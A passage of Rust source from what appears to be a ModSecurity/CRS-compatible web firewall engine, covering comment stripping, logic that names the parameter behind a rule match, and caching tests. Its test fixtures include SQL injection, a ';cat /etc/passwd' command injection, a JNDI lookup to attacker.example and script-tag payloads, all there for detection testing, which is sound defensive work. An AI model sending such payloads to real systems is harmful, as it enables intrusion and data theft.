    if !s.contains("..") && !s.contains("//") && !s.contains("./") {
        return s;
    }
    let leading = s.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    for seg in s.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            other => parts.push(other),
        }
    }
    let mut out = parts.join("/");
    if leading {
        out.insert(0, '/');
    }
    out
}

/// Strip C-style comment characters (`/*` and `*/`) from input.
fn remove_comments_char(s: String) -> String {
    s.replace("/*", "").replace("*/", "").replace("//", "")
}

/// Remove SQL/C block comments (`/* ... */`) from input.
///
/// Same result as the loop this replaces — delete the leftmost complete comment,
/// rescan from the start, stop at the first unterminated `/*` — without that
/// loop's full rebuild per comment (quadratic: seconds on a 1 MB body of `/**/`).
/// The rescan had one visible effect that is kept: deleting a comment can join
/// a `/` before it to a `*` after it into a NEW opener (`/` `/**/` `*x*/` →
/// `/*x*/` → ``), so a trailing `/` already emitted is checked first.
fn remove_sql_comments(s: String) -> String {
    if !s.contains("/*") {
        return s;
    }
    // Invariant: the string so far is `out + s[i..]`, and `out` holds no `/*`.
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    loop {
        // (where `out` stops taking input, index just past the opener's `*`)
        let (copy_to, body) = if out.ends_with('/') && s[i..].starts_with('*') {
            (None, i + 1)
        } else {
            match s[i..].find("/*") {
                Some(p) => (Some(i + p), i + p + 2),
                None => break,
            }
        };
        let Some(close) = s[body..].find("*/") else {
            break; // unterminated: the rest stays as it is
        };
        match copy_to {
            Some(start) => out.push_str(&s[i..start]),
            None => {
                out.pop(); // the `/` that opened this comment
            }
        }
        i = body + close + 2;
    }
    out.push_str(&s[i..]);
    out
}

/// Replace SQL/C block comments with a single space.
///
/// One pass, same result as the rescan loop it replaces (see
/// [`remove_sql_comments`]). The emitted space means a deletion can never join
/// two halves into a new opener, so no lookbehind is needed here.
fn replace_sql_comments(s: String) -> String {
    if !s.contains("/*") {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while let Some(p) = s[i..].find("/*") {
        let start = i + p;
        let Some(close) = s[start + 2..].find("*/") else {
            break; // unterminated: the rest stays as it is
        };
        out.push_str(&s[i..start]);
        out.push(' ');
        i = start + 2 + close + 2;
    }
    out.push_str(&s[i..]);
    out
}

// ---------------------------------------------------------------------------
// Stack helpers
// ---------------------------------------------------------------------------

fn pop_strings(stack: &mut Vec<StackVal>) -> Rc<Vec<String>> {
    match stack.pop() {
        Some(StackVal::Strings(v)) => v,
        Some(other) => {
            warn!("VM: expected Strings on stack, got {:?}", other);
            Rc::default()
        }
        None => {
            warn!("VM: stack underflow on pop_strings");
            Rc::default()
        }
    }
}

fn pop_bool(stack: &mut Vec<StackVal>) -> bool {
    match stack.pop() {
        Some(StackVal::Bool(b)) => b,
        Some(StackVal::Absent) => false,
        Some(other) => {
            warn!("VM: expected Bool on stack, got {:?}", other);
            false
        }
        None => {
            warn!("VM: stack underflow on pop_bool");
            false
        }
    }
}

fn pop_numeric_f64(stack: &mut Vec<StackVal>) -> f64 {
    match stack.pop() {
        Some(StackVal::Int(v)) => v as f64,
        Some(StackVal::Float(v)) => v as f64,
        // TX variables are stored as strings; parse numerically when compared.
        // This makes @lt / @ge work against TX:DETECTION_PARANOIA_LEVEL etc.
        Some(StackVal::Strings(v)) => v.first().and_then(|s| s.parse::<f64>().ok()).unwrap_or(0.0),
        Some(other) => {
            warn!("VM: expected numeric on stack, got {:?}", other);
            0.0
        }
        None => {
            warn!("VM: stack underflow on pop_numeric");
            0.0
        }
    }
}

// ---------------------------------------------------------------------------
// Match location — which parameter held the matched text (for logging only)
// ---------------------------------------------------------------------------

/// The named values of one request, labelled the way a ModSecurity exclusion
/// names them (`ARGS:q`, `REQUEST_COOKIES:lang`, `REQUEST_HEADERS:x-api-version`).
///
/// A RuleMatch records the COLLECTION a rule read (`ARGS`), or nothing when the
/// rule read several (`ARGS|REQUEST_HEADERS|…` — every 99001xx all-placement
/// signature). Either way the event never named the parameter, which is the one
/// thing an operator needs to judge a false positive or scope an exclusion. F5
/// and BunkerWeb both show it.
///
/// Built once per LOGGED request, by the logger, from the same parsers the VM
/// uses — never on the evaluation path, so detection cost is unchanged.
pub struct RequestValues {
    /// `(collection, label, value)`. A label is shared by every value of one
    /// body parameter, as its name is (see [`ArgName`]).
    entries: Vec<(Collection, Arc<str>, String)>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Collection {
    ArgsGet,
    ArgsPost,
    ArgsNames,
    Cookies,
    Headers,
    Filename,
    Body,
}

impl RequestValues {
    /// Parse the request only if some match can use it: one whose target is not
    /// already exact and that captured text to look for. The logger calls this
    /// for every logged record — on a site reached by IP address that is every
    /// request (920350 on the Host header, already exact) — and re-parsing a
    /// large JSON body there would be pure waste.
    pub fn for_matches(ctx: &RequestContext) -> Self {
        let useful = ctx
            .rule_matches
            .iter()
            .any(|m| !m.target.contains(':') && !m.matched_value.is_empty());
        if useful {
            Self::from_ctx(ctx)
        } else {
            Self {
                entries: Vec::new(),
            }
        }
    }

    pub fn from_ctx(ctx: &RequestContext) -> Self {
        // Its own views, built here once: the logger runs after `evaluate`,
        // whose views are gone by then. Same parsers, so the values listed are
        // the values the rules read.
        let views = RequestViews::default();
        let mut entries = Vec::new();
        // Arguments past the site's limits are not listed: the engine refused
        // to parse them, so no ARGS-family rule matched in them either.
        let unlisted = Params::default();
        for (k, v) in views.query(ctx).unwrap_or(&unlisted).iter() {
            entries.push((
                Collection::ArgsNames,
                format!("ARGS_NAMES:{k}").into(),
                k.to_owned(),
            ));
            entries.push((
                Collection::ArgsGet,
                format!("ARGS:{k}").into(),
                v.to_owned(),
            ));
        }
        // A body that cannot be listed is listed raw, below.
        let body = views.body(ctx).unwrap_or(&unlisted);
        let body_parsed = !body.is_empty();
        // Each listed name is labelled — and listed under ARGS_NAMES — once,
        // its values sharing the label: formatting it per value copied a name
        // as many times as it had values.
        let mut labels: Vec<Option<Arc<str>>> = vec![None; body.names.len()];
        for (i, v) in body.values.iter().enumerate() {
            let k = &body.names[body.listed(i)];
            let label = labels[body.listed(i)].get_or_insert_with(|| {
                if k.is_empty() {
                    return "REQUEST_BODY".into();
                }
                entries.push((
                    Collection::ArgsNames,
                    format!("ARGS_NAMES:{k}").into(),
                    k.clone(),
                ));
                format!("ARGS:{k}").into()
            });
            entries.push((Collection::ArgsPost, label.clone(), v.clone()));
        }
        for (k, v) in views.cookies(ctx) {
            entries.push((
                Collection::Cookies,
                format!("REQUEST_COOKIES:{k}").into(),
                v.clone(),
            ));
        }
        for (name, value) in ctx.request_headers.iter() {
            entries.push((
                Collection::Headers,
                format!("REQUEST_HEADERS:{}", name.as_str()).into(),
                header_text(value).into_owned(),
            ));
        }
        entries.push((
            Collection::Filename,
            "REQUEST_FILENAME".into(),
            percent_decode(ctx.uri.path()),
        ));
        // The raw body only when no parser claimed it: a parsed body is already
        // listed field by field, and listing it twice would make every body
        // match "ambiguous".
        if !body_parsed {
            if let Some(b) = ctx.request_body.as_ref() {
                entries.push((
                    Collection::Body,
                    "REQUEST_BODY".into(),
                    String::from_utf8_lossy(b).into_owned(),
                ));
            }
        }
        Self { entries }
    }

    /// Name the one place `matched` sits, within what `rule_target` says the
    /// rule read — or `None` when that is not certain.
    ///
    /// Certainty is the whole contract: naming the wrong parameter sends an
    /// operator to write an exclusion against a field that never fired. So a
    /// label is returned only when EXACTLY ONE location contains the text:
    /// - `rule_target` a specific member (`REQUEST_HEADERS:User-Agent`) is
    ///   already exact and is returned unchanged;
    /// - a collection (`ARGS`, `REQUEST_COOKIES`, …) is refined within it;
    /// - empty (the rule read several collections) searches all of them, minus
    ///   `Cookie` and `Referer`, which only repeat values listed elsewhere.
    ///
    /// The comparison is case-insensitive over collapsed whitespace, because
    /// the matched text is post-transform (lowercased, decoded) while the listed
    /// values are as parsed.
    pub fn locate(&self, rule_target: &str, matched: &str) -> Option<String> {
        if rule_target.contains(':') {
            return Some(rule_target.to_string());
        }
        let needle = normalize_for_locate(matched);
        if needle.is_empty() || needle.starts_with("[redacted") {
            return None;
        }
        let allowed: &[Collection] = match rule_target {
            "" => &[
                Collection::ArgsGet,
                Collection::ArgsPost,
                Collection::Cookies,
                Collection::Headers,
                Collection::Filename,
                Collection::Body,
            ],
            "ARGS" => &[Collection::ArgsGet, Collection::ArgsPost],
            "ARGS_GET" | "QUERY_STRING" => &[Collection::ArgsGet],
            "ARGS_NAMES" | "ARGS_GET_NAMES" => &[Collection::ArgsNames],
            "REQUEST_COOKIES" => &[Collection::Cookies],
            "REQUEST_HEADERS" => &[Collection::Headers],
            "REQUEST_FILENAME" => return Some(rule_target.to_string()),
            _ => return None,
        };
        let multi = rule_target.is_empty();
        let mut found: Option<&Arc<str>> = None;
        for (coll, label, value) in &self.entries {
            if !allowed.contains(coll) {
                continue;
            }
            if multi
                && *coll == Collection::Headers
                && matches!(
                    &**label,
                    "REQUEST_HEADERS:cookie" | "REQUEST_HEADERS:referer"
                )
            {
                continue;
            }
            if normalize_for_locate(value).contains(&needle) {
                match found {
                    None => found = Some(label),
                    // Another value of the same parameter: one shared label,
                    // compared by identity before text.
                    Some(prev) if Arc::ptr_eq(prev, label) || prev == label => {}
                    Some(_) => return None, // two places — not certain
                }
            }
        }
        found.map(|label| label.to_string())
    }
}

fn normalize_for_locate(s: &str) -> String {
    s.split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
}

#[cfg(test)]
mod locate_tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr};

    fn ctx(uri: &str) -> RequestContext {
        let mut c = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1);
        c.uri = uri.parse().unwrap();
        c
    }

    #[test]
    fn names_the_query_parameter_a_multi_target_rule_matched() {
        // The 2026-09-24 case: 9900100 read several collections, so the event
        // said target="" for a UNION payload that was plainly in ?q=.
        let c = ctx(
            "/rest/products/search?q=%27))%20UNION%20SELECT%20id,email%20FROM%20Users--&lang=en",
        );
        let v = RequestValues::from_ctx(&c);
        assert_eq!(
            v.locate("", "')) UNION SELECT id,email FROM Users--")
                .as_deref(),
            Some("ARGS:q")
        );
        // Post-transform text (lowercased) still finds it.
        assert_eq!(
            v.locate("", "')) union select id,email from users--")
                .as_deref(),
            Some("ARGS:q")
        );
    }

    #[test]
    fn refines_a_collection_label_to_the_member() {
        let c = ctx("/x?a=1&cmd=;cat%20/etc/passwd");
        let v = RequestValues::from_ctx(&c);
        assert_eq!(
            v.locate("ARGS", ";cat /etc/passwd").as_deref(),
            Some("ARGS:cmd")
        );
    }

    #[test]
    fn names_a_json_body_field() {
        let mut c = ctx("/rest/user/login");
        c.request_headers
            .insert("content-type", "application/json".parse().unwrap());
        c.request_body = Some(br#"{"email":"' OR 1=1--","password":"x"}"#.to_vec().into());
        let v = RequestValues::from_ctx(&c);
        assert_eq!(v.locate("", "' OR 1=1--").as_deref(), Some("ARGS:email"));
    }

    #[test]
    fn names_a_header() {
        let mut c = ctx("/rest/products/search?q=apple");
        c.request_headers.insert(
            "x-api-version",
            "${jndi:ldap://attacker.example/a}".parse().unwrap(),
        );
        let v = RequestValues::from_ctx(&c);
        assert_eq!(
            v.locate("", "${jndi").as_deref(),
            Some("REQUEST_HEADERS:x-api-version")
        );
    }

    #[test]
    fn refuses_to_guess_when_the_text_is_in_two_places() {
        let c = ctx("/x?a=%3Cscript%3E&b=%3Cscript%3E");
        let v = RequestValues::from_ctx(&c);
        assert_eq!(v.locate("", "<script>"), None);
        assert_eq!(v.locate("ARGS", "<script>"), None);
    }

    #[test]
    fn a_referer_repeating_the_payload_does_not_make_it_ambiguous() {
        let mut c = ctx("/x?q=%3Cscript%3E");
        c.request_headers
            .insert("referer", "http://site/x?q=<script>".parse().unwrap());
        let v = RequestValues::from_ctx(&c);
        assert_eq!(v.locate("", "<script>").as_deref(), Some("ARGS:q"));
    }

    #[test]
    fn parses_nothing_when_no_match_needs_locating() {
        let mut c = ctx("/x?q=%3Cscript%3E");
        c.rule_matches.push(RuleMatch {
            rule_id: "920350".into(),
            message: "Host header is a numeric IP address".into(),
            severity: Severity::Notice,
            score: 3,
            target: "REQUEST_HEADERS:Host".into(),
            phase: Phase::RequestHeaders,
            matched_value: "172.16.21.71".into(),
        });
        assert!(RequestValues::for_matches(&c).entries.is_empty());
        c.rule_matches[0].target = "ARGS".into();
        c.rule_matches[0].matched_value = "<script>".into();
        assert!(!RequestValues::for_matches(&c).entries.is_empty());
    }

    #[test]
    fn keeps_an_exact_target_and_never_invents_one() {
        let v = RequestValues::from_ctx(&ctx("/x?q=1"));
        assert_eq!(
            v.locate("REQUEST_HEADERS:User-Agent", "sqlmap").as_deref(),
            Some("REQUEST_HEADERS:User-Agent")
        );
        assert_eq!(v.locate("", ""), None, "no matched text, no location");
        assert_eq!(v.locate("", "[redacted: sensitive field]"), None);
        assert_eq!(v.locate("", "not-in-the-request"), None);
        assert_eq!(
            v.locate("RESPONSE_BODY", "x"),
            None,
            "outside what we can map"
        );
    }
}

// ---------------------------------------------------------------------------
// Per-evaluate view tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod view_cache_tests {
    use super::*;
    use crate::crs_compat::import_secrule_conf;
    use std::net::{IpAddr, Ipv4Addr};

    fn ruleset(src: &str) -> CompiledRuleSet {
        crate::compile(import_secrule_conf(src).expect("import")).expect("compile")
    }

    fn post(uri: &str, content_type: &str, body: &str) -> RequestContext {
        let mut c = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1);
        c.method = http::Method::POST;
        c.uri = uri.parse().unwrap();
        c.request_headers
            .insert("content-type", content_type.parse().unwrap());
        c.request_headers
            .insert("cookie", "session=abc123; theme=dark".parse().unwrap());
        c.request_body = Some(bytes::Bytes::from(body.to_owned()));
        c
    }

    /// `[query, body, multipart, cookies, transform]` builds on this thread
    /// since `reset`.
    fn builds() -> [usize; 5] {
        VIEW_BUILDS.with(|b| b.get())
    }

    fn reset() {
        VIEW_BUILDS.with(|b| b.set([0; 5]));
    }

    /// Every collection the parsed views back, each read by several rules —
    /// the shape of CRS, where well over a hundred rules load ARGS. Rule 16
    /// fires, so the credential-redaction pass reads the views as well.
    const RULES: &str = r#"
SecRule ARGS "@rx never-a" "id:1,phase:2,pass,t:none"
SecRule ARGS "@rx never-b" "id:2,phase:2,pass,t:lowercase"
SecRule ARGS_NAMES "@rx never-c" "id:3,phase:2,pass"
SecRule ARGS_GET "@rx never-d" "id:4,phase:2,pass"
SecRule ARGS_GET_NAMES "@rx never-e" "id:5,phase:2,pass"
SecRule &ARGS "@gt 1000" "id:6,phase:2,pass"
SecRule ARGS_COMBINED_SIZE "@gt 100000000" "id:7,phase:2,pass"
SecRule REQUEST_COOKIES "@rx never-f" "id:8,phase:2,pass"
SecRule REQUEST_COOKIES_NAMES "@rx never-g" "id:9,phase:2,pass"
SecRule REQUEST_COOKIES:session "@rx never-h" "id:10,phase:2,pass"
SecRule FILES "@rx never-i" "id:11,phase:2,pass"
SecRule FILES_NAMES "@rx never-j" "id:12,phase:2,pass"
SecRule FILES_COMBINED_SIZE "@gt 100000000" "id:13,phase:2,pass"
SecRule MULTIPART_PART_HEADERS "@rx never-k" "id:14,phase:2,pass"
SecRule REQUEST_BODY "@rx never-l" "id:15,phase:2,pass"
SecRule ARGS "@rx hello" "id:16,phase:2,pass,msg:'fires',severity:'NOTICE'"
SecRule ARGS|ARGS_NAMES "@rx never-m" "id:17,phase:2,pass,t:none,t:urlDecodeUni"
"#;

    /// Each request view is parsed at most once per `evaluate` call, however
    /// many rules read it. Every ARGS rule used to re-parse the query string
    /// and the JSON body, and every FILES rule re-split the multipart envelope.
    #[test]
    fn each_view_is_parsed_once_per_evaluate() {
        let rs = ruleset(RULES);

        let mut json = post(
            "/api/orders?q=hello&page=2",
            "application/json",
            r#"{"user":{"name":"ann","tags":["a","b"]},"note":"hi"}"#,
        );
        reset();
        evaluate(&rs, &mut json, Phase::RequestBody, 0);
        assert!(
            json.rule_matches.iter().any(|m| m.rule_id == "16"),
            "the probe rule must fire, or the redaction pass was not exercised"
        );
        let [query, body, multipart, cookies, _] = builds();
        assert!(
            query == 1 && body == 1 && cookies == 1 && multipart <= 1,
            "one evaluate parsed the query string {query}x, the JSON body {body}x, \
             the Cookie header {cookies}x and the multipart envelope {multipart}x"
        );

        let boundary = "XyZ";
        let form = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n\
             --{boundary}\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"a.txt\"\r\n\
             Content-Type: text/plain\r\n\r\nfile body\r\n--{boundary}--\r\n"
        );
        let mut multi = post(
            "/upload",
            &format!("multipart/form-data; boundary={boundary}"),
            &form,
        );
        reset();
        evaluate(&rs, &mut multi, Phase::RequestBody, 0);
        assert!(
            multi.rule_matches.iter().any(|m| m.rule_id == "16"),
            "the multipart field must reach ARGS"
        );
        let [_, body, multipart, _, _] = builds();
        assert!(
            multipart == 1 && body == 0,
            "one evaluate parsed the multipart envelope {multipart}x and built \
             a separate copy of its fields {body}x"
        );

        // A second call builds its own views: nothing outlives one evaluate.
        reset();
        evaluate(&rs, &mut multi, Phase::RequestBody, 0);
        assert_eq!(builds()[2], 1, "the next evaluate must parse afresh");
    }

    /// A transform chain runs once per (target, chain) pair per call, not once
    /// per rule: CRS reads ARGS through `t:urlDecodeUni` in over a hundred
    /// rules, and every one of them used to decode every argument again.
    #[test]
    fn each_transform_chain_runs_once_per_target() {
        let rs = ruleset(
            r#"
SecRule ARGS "@rx never-a" "id:1,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx never-b" "id:2,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx never-c" "id:3,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx never-d" "id:4,phase:2,pass,t:none,t:lowercase"
SecRule ARGS "@rx never-e" "id:5,phase:2,pass,t:none,t:lowercase"
SecRule ARGS_NAMES "@rx never-f" "id:6,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS_NAMES "@rx never-g" "id:7,phase:2,pass,t:none,t:urlDecodeUni"
SecRule ARGS "@rx ^hello world$" "id:8,phase:2,pass,t:none,t:lowercase,msg:'fires'"
"#,
        );
        let mut c = post("/x?q=Hello+World&b=2", "application/json", r#"{"n":"x"}"#);
        reset();
        evaluate(&rs, &mut c, Phase::RequestBody, 0);
        let runs = builds()[4];
        assert_eq!(
            runs, 3,
            "8 rules over 3 distinct (target, chain) pairs ran {runs} chains"
        );
        assert!(c.rule_matches.iter().any(|m| m.rule_id == "8"));
    }

    /// A use count of `n` for each key: what `memo_uses` would report for a
    /// program in which `n` rules read each of them.
    fn read_by(n: u32, keys: &[MemoKey]) -> HashMap<MemoKey, u32> {
        keys.iter().map(|k| (k.clone(), n)).collect()
    }

    fn key(spec: TargetSpec, chain: &[Transform]) -> MemoKey {
        (spec, chain.to_vec())
    }

    /// The memo hands back exactly what applying the chain directly produces —
    /// same values, same order — whether it is the first request for a pair or
    /// a repeat, and whatever order the pairs are asked for in.
    #[test]
    fn memoized_transforms_match_direct_application() {
        let c = post(
            "/x?a=%253Cscript%253E&B=Mixed%20Case&c=%00nul&d=caf%C3%A9&e=",
            "application/x-www-form-urlencoded",
            "f=%26lt%3Bimg%26gt%3B&g=a%2F..%2F..%2Fetc&h=\\x41\\u0041&i=%E2%82%AC",
        );
        let chains: Vec<Vec<Transform>> = vec![
            vec![Transform::UrlDecodeUni],
            vec![Transform::Lowercase],
            vec![
                Transform::Utf8ToUnicode,
                Transform::UrlDecodeUni,
                Transform::HtmlEntityDecode,
                Transform::JsDecode,
                Transform::CssDecode,
                Transform::RemoveNulls,
            ],
            vec![Transform::CmdLine, Transform::NormalisePath],
            vec![Transform::EscapeSeqDecode],
            vec![Transform::Length],
        ];
        let specs = [
            TargetSpec::Args,
            TargetSpec::ArgsNames,
            TargetSpec::RequestBody,
        ];
        let keys: Vec<MemoKey> = specs
            .iter()
            .flat_map(|s| chains.iter().map(|ch| key(s.clone(), ch)))
            .chain(specs.iter().map(|s| key(s.clone(), &[])))
            .collect();
        let uses = read_by(2, &keys);
        let views = RequestViews::new(&uses);
        for spec in specs {
            let base = views.load(&spec, &c, None).unwrap();
            for chain in chains.iter().chain(chains.iter().rev()) {
                let direct: Vec<String> = base
                    .iter()
                    .map(|s| apply_transforms(s.clone(), chain))
                    .collect();
                let memo = views.load_transformed(&spec, chain, &c).unwrap();
                assert_eq!(*memo, direct, "{spec:?} through {chain:?}");
            }
            // The base values themselves are never rewritten by a chain.
            assert_eq!(*views.load(&spec, &c, None).unwrap(), *base);
        }
        assert!(views.memo_bytes.get() <= memo_budget(&c));
    }

    /// ARGS, ARGS_NAMES and ARGS_GET are the parsed lists themselves, handed
    /// out without a copy, whenever one side of the request is empty — a POST
    /// without a query string, or a GET. So is a multipart body's REQUEST_BODY,
    /// and its body parameters are the multipart view's fields, not a copy of
    /// them. Each of these used to be a full copy of the body's names or values,
    /// kept for the rest of the call.
    #[test]
    fn args_are_the_parsed_lists_not_copies() {
        let keys = [
            key(TargetSpec::Args, &[]),
            key(TargetSpec::ArgsNames, &[]),
            key(TargetSpec::ArgsGet, &[]),
            key(TargetSpec::ArgsGetNames, &[]),
            key(TargetSpec::RequestBody, &[]),
        ];
        let uses = read_by(50, &keys);
        let same = |a: &Rc<Vec<String>>, b: &Rc<Vec<String>>| Rc::ptr_eq(a, b);

        let form = post(
            "/login",
            "application/x-www-form-urlencoded",
            "user=ann&pass=x",
        );
        let views = RequestViews::new(&uses);
        let body = views.body(&form).unwrap();
        assert!(same(
            &views.load(&TargetSpec::Args, &form, None).unwrap(),
            &body.values
        ));
        assert!(same(
            &views.load(&TargetSpec::ArgsNames, &form, None).unwrap(),
            &body.names
        ));
        assert_eq!(
            *views.load(&TargetSpec::ArgsNames, &form, None).unwrap(),
            ["user", "pass"]
        );
        assert_eq!(views.memo_bytes.get(), 0, "nothing was copied");

        let mut get = post("/search?q=shoes&page=2", "", "");
        get.request_body = None;
        let views = RequestViews::new(&uses);
        let query = views.query(&get).unwrap();
        for spec in [TargetSpec::Args, TargetSpec::ArgsGet] {
            assert!(same(&views.load(&spec, &get, None).unwrap(), &query.values));
        }
        for spec in [TargetSpec::ArgsNames, TargetSpec::ArgsGetNames] {
            assert!(same(&views.load(&spec, &get, None).unwrap(), &query.names));
        }
        assert_eq!(views.memo_bytes.get(), 0, "nothing was copied");

        let boundary = "XyZ";
        let body = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n\
             --{boundary}\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"a.txt\"\r\n\
             Content-Type: text/plain\r\n\r\nfile body\r\n--{boundary}--\r\n"
        );
        let multi = post(
            "/upload",
            &format!("multipart/form-data; boundary={boundary}"),
            &body,
        );
        let views = RequestViews::new(&uses);
        assert!(
            std::ptr::eq(
                views.body(&multi).unwrap(),
                &views.multipart(&multi).unwrap().fields
            ),
            "a multipart body's parameters must be the multipart view's fields"
        );
        let fields = &views.multipart(&multi).unwrap().fields;
        assert_eq!(*fields.values, ["hello"]);
        assert!(same(
            &views.load(&TargetSpec::Args, &multi, None).unwrap(),
            &fields.values
        ));
        assert!(same(
            &views.load(&TargetSpec::RequestBody, &multi, None).unwrap(),
            &fields.values
        ));
        assert_eq!(views.memo_bytes.get(), 0, "nothing was copied");
    }

    /// A request carrying parameters on both sides gets ONE joined copy of ARGS
    /// — query first, then body, as before — and that copy is charged to the
    /// budget like any other.
    #[test]
    fn a_joined_args_copy_is_ordered_and_charged() {
        let c = post("/x?a=1&b=2", "application/json", r#"{"c":"3","d":"4"}"#);
        let uses = read_by(50, &[key(TargetSpec::Args, &[])]);
        let views = RequestViews::new(&uses);
        let args = views.load(&TargetSpec::Args, &c, None).unwrap();
        assert_eq!(*args, ["1", "2", "3", "4"]);
        assert_eq!(
            *views.load(&TargetSpec::ArgsNames, &c, None).unwrap(),
            ["a", "b", "c", "d"]
        );
        assert_eq!(views.memo_bytes.get(), held_size(&args));
        assert!(Rc::ptr_eq(
            &views.load(&TargetSpec::Args, &c, None).unwrap(),
            &args
        ));
        assert_eq!(views.count(&TargetSpec::Args, &c, None).unwrap(), 4);
    }

    /// Body of `n` fields `k=VALUE...` whose values every lower-casing chain
    /// rewrites. About 50 bytes per field, 74 of copy with the value header.
    fn upper_case_form(n: usize) -> RequestContext {
        let body: String = (0..n)
            .map(|i| format!("k{i}=VALUE+NUMBER+{i:08}+XXXXXXXXXXXXXXXXXXXXXXXX"))
            .collect::<Vec<_>>()
            .join("&");
        post("/x", "application/x-www-form-urlencoded", &body)
    }

    /// A body built so that every chain rewrites every value would make the
    /// memo hold one copy per chain. Past the budget a chain's output is still
    /// returned, correct, but not kept — and the refusal is flagged, once.
    #[test]
    fn transform_memo_stays_within_its_budget() {
        // ~1.6 MB of body: one rewritten copy (~2.2 MB with value headers) fits
        // the budget of twice the body, a second one no longer does.
        let c = upper_case_form(30_000);
        let budget = memo_budget(&c);
        let lower = [Transform::Lowercase];
        let lower_squeezed = [Transform::Lowercase, Transform::RemoveWhitespace];
        let uses = read_by(
            2,
            &[
                key(TargetSpec::Args, &lower),
                key(TargetSpec::Args, &lower_squeezed),
            ],
        );
        let views = RequestViews::new(&uses);
        let first = views
            .load_transformed(&TargetSpec::Args, &lower, &c)
            .unwrap();
        assert!(!views.memo_refused.get());
        let second = views
            .load_transformed(&TargetSpec::Args, &lower_squeezed, &c)
            .unwrap();
        assert!(first[0].starts_with("value number"));
        assert!(second[0].starts_with("valuenumber"));
        assert!(views.memo_bytes.get() <= budget);
        assert!(
            views.memo_refused.get(),
            "the refusal must be flagged for the log"
        );
        let memo = views.memo.borrow();
        assert!(memo.contains_key(&key(TargetSpec::Args, &lower)));
        assert!(
            !memo.contains_key(&key(TargetSpec::Args, &lower_squeezed)),
            "a chain past the budget must not be kept"
        );
    }

    /// Copies no view holds count against the budget too, not only transform
    /// output: a joined ARGS too big for the budget is handed out but not kept.
    /// The old memo kept every untransformed target uncounted, so a hostile
    /// body of tiny fields held several copies of itself for the whole call.
    #[test]
    fn untransformed_copies_are_charged_to_the_budget() {
        // 400 000 one-byte fields: ~1.6 MB of body, but every value is a
        // 24-byte String header plus its byte, so a joined ARGS is ~10 MB.
        let body = "a=1&".repeat(400_000);
        let c = post("/x?q=1", "application/x-www-form-urlencoded", &body);
        let uses = read_by(
            350,
            &[key(TargetSpec::Args, &[]), key(TargetSpec::ArgsNames, &[])],
        );
        let views = RequestViews::new(&uses);
        let args = views.load(&TargetSpec::Args, &c, None).unwrap();
        assert_eq!(args.len(), 400_001);
        assert!(held_size(&args) > memo_budget(&c));
        assert!(views.memo.borrow().is_empty(), "past the budget: not kept");
        assert_eq!(views.memo_bytes.get(), 0);
        assert!(views.memo_refused.get());
    }

    /// A pair only one rule reads is never kept: keeping it saves nothing, and
    /// CRS 921110 reading REQUEST_BODY through `t:htmlEntityDecode,t:lowercase`
    /// once, early, would otherwise take budget the chains that dozens of rules
    /// share need later.
    #[test]
    fn a_chain_one_rule_reads_is_not_kept() {
        let c = upper_case_form(100);
        let lower = [Transform::Lowercase];
        let mut uses = read_by(1, &[key(TargetSpec::Args, &lower)]);
        let views = RequestViews::new(&uses);
        let out = views
            .load_transformed(&TargetSpec::Args, &lower, &c)
            .unwrap();
        assert!(out[0].starts_with("value number"));
        assert!(views.memo.borrow().is_empty());
        assert_eq!(views.memo_bytes.get(), 0);

        uses.insert(key(TargetSpec::Args, &lower), 2);
        let views = RequestViews::new(&uses);
        views
            .load_transformed(&TargetSpec::Args, &lower, &c)
            .unwrap();
        assert!(views
            .memo
            .borrow()
            .contains_key(&key(TargetSpec::Args, &lower)));
    }

    /// When the budget is full, a chain more rules read displaces the copies
    /// of chains fewer rules read — whichever rule asked first — and a chain
    /// fewer rules read cannot displace it in turn.
    #[test]
    fn the_most_read_chain_keeps_its_copy() {
        let c = upper_case_form(30_000);
        let rare = [Transform::Lowercase, Transform::RemoveWhitespace];
        let common = [Transform::Lowercase];
        let rarest = [Transform::Lowercase, Transform::CompressWhitespace];
        let mut uses = read_by(5, &[key(TargetSpec::Args, &rare)]);
        uses.insert(key(TargetSpec::Args, &common), 19);
        uses.insert(key(TargetSpec::Args, &rarest), 2);
        let views = RequestViews::new(&uses);

        views
            .load_transformed(&TargetSpec::Args, &rare, &c)
            .unwrap();
        assert!(views
            .memo
            .borrow()
            .contains_key(&key(TargetSpec::Args, &rare)));
        let kept = views
            .load_transformed(&TargetSpec::Args, &common, &c)
            .unwrap();
        {
            let memo = views.memo.borrow();
            assert!(memo.contains_key(&key(TargetSpec::Args, &common)));
            assert!(
                !memo.contains_key(&key(TargetSpec::Args, &rare)),
                "the less-read copy must make room"
            );
        }
        assert_eq!(views.memo_bytes.get(), held_size(&kept));
        views
            .load_transformed(&TargetSpec::Args, &rarest, &c)
            .unwrap();
        let memo = views.memo.borrow();
        assert!(memo.contains_key(&key(TargetSpec::Args, &common)));
        assert!(!memo.contains_key(&key(TargetSpec::Args, &rarest)));
        assert!(views.memo_bytes.get() <= memo_budget(&c));
    }

    /// A raw body is copied per read rather than kept, but when chains leave
    /// it unchanged their output IS that copy: it is kept once, charged once,
    /// and shared by every such chain and by plain reads.
    #[test]
    fn an_unchanged_raw_body_is_kept_once() {
        let c = post(
            "/x",
            "application/json",
            r#"{"note":"plain lower-case text"}"#,
        );
        let lower = [Transform::Lowercase];
        let decode = [Transform::UrlDecodeUni];
        let uses = read_by(
            4,
            &[
                key(TargetSpec::RequestBody, &[]),
                key(TargetSpec::RequestBody, &lower),
                key(TargetSpec::RequestBody, &decode),
            ],
        );
